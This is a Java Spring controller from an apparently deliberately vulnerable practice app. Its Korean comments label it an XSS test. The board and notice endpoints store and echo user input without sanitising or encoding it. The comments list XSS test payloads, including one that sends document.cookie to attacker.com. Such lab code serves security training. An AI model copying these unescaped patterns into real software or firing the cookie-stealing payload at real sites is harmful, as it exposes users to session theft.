package com.vulnapp.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.List;
import java.util.Map;

/**
 * ══════════════════════════════════════════════════════
 *  [취약점 2] XSS (Reflected / Stored) 테스트 컨트롤러
 *
 *  URL:
 *    GET  /nas/board/boardList.do           — 게시판 목록 (Stored XSS)
 *    POST /nas/board/boardWrite.do          — 게시글 작성 (Stored XSS 삽입)
 *    GET  /nas/board/notice.do?msg=<PAYLOAD>— 공지사항 (Reflected XSS)
 *    GET  /nas/board/search.do?q=<PAYLOAD>  — 게시판 검색 (Reflected XSS)
 *
 *  취약 포인트:
 *    - 출력 시 HTML 인코딩 없이 그대로 렌더링
 *    - 서버 측 입력 필터 없음
 * ══════════════════════════════════════════════════════
 */
@Controller
public class BoardController {

    @Autowired
    private JdbcTemplate jdbc;

    // ──────────────────────────────────────────────────────────────
    // [XSS-1] Stored XSS — 게시판 목록
    // DB에 저장된 HTML이 이스케이프 없이 출력됨
    // ──────────────────────────────────────────────────────────────
    @GetMapping("/board/boardList.do")
    public String boardList(Model model) {
        List<Map<String, Object>> posts = jdbc.queryForList(
            "SELECT id, author, title, content, created FROM board ORDER BY id DESC"
        );
        model.addAttribute("posts", posts);
        return "boardList";
    }

    // ──────────────────────────────────────────────────────────────
    // [XSS-2] Stored XSS — 게시글 작성
    // ★ 취약: 입력값을 sanitize 없이 DB에 저장
    // 테스트: title=<script>alert('XSS')</script>
    //         content=<img src=x onerror="document.location='http://attacker.com?c='+document.cookie">
    // ──────────────────────────────────────────────────────────────
    @PostMapping("/board/boardWrite.do")
    public String boardWrite(
            @RequestParam String author,
            @RequestParam String title,
            @RequestParam String content) {

        // ★ 취약 코드: 직접 DB 저장 (sanitize 없음)
        jdbc.update("INSERT INTO board (author, title, content) VALUES (?, ?, ?)",
                    author, title, content);
        return "redirect:/board/boardList.do";
    }

    // ──────────────────────────────────────────────────────────────
    // [XSS-3] Reflected XSS — 공지사항 메시지
    // ★ 취약: msg 파라미터를 response에 직접 출력
    // 테스트: msg=<script>alert(document.cookie)</script>
    //         msg=<svg/onload=alert(1)>
    // ──────────────────────────────────────────────────────────────
    @GetMapping("/board/notice.do")
    public String notice(
            @RequestParam(required = false, defaultValue = "") String msg,
            Model model) {
        // ★ 취약: htmlEscape 처리 없이 모델에 그대로 전달
        model.addAttribute("msg", msg);
        return "notice";
    }

    // ──────────────────────────────────────────────────────────────
    // [XSS-4] Reflected XSS — 검색어 출력
    // 테스트: q=<script>alert(1)</script>
    //         q="><script>alert(1)</script>  (속성값 탈출)
    //         q=<img src=x onerror=alert(1)>
    // ──────────────────────────────────────────────────────────────
    @GetMapping("/board/boardSearch.do")
    public String boardSearch(
            @RequestParam(required = false, defaultValue = "") String q,
            Model model) {
        // ★ 취약: 검색어를 인코딩 없이 반환
        List<Map<String, Object>> posts = jdbc.queryForList(
            "SELECT * FROM board WHERE title LIKE ? OR content LIKE ?",
            "%" + q + "%", "%" + q + "%"
        );
        model.addAttribute("q", q);
        model.addAttribute("posts", posts);
        return "boardSearch";
    }
}
